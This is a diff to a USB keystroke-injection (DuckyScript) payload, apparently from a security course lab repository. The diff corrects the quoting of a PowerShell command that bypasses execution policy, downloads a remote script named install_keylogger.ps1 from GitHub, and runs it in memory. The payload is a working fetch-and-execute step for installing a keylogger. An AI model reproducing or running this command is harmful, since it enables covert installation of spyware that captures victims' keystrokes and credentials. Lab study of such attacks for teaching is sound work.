@@ -5,7 +5,7 @@ REM IMPORTANT: Replace placeholder URLs with actual raw GitHub file URLs.
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString(https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Keylogger/install_keylogger.ps1'))"
+STRING powershell -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString(https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Keylogger/install_keylogger.ps1))"
 ENTER
 
 REM --- install_keylogger.ps1 (PowerShell Script - to be hosted on GitHub) ---
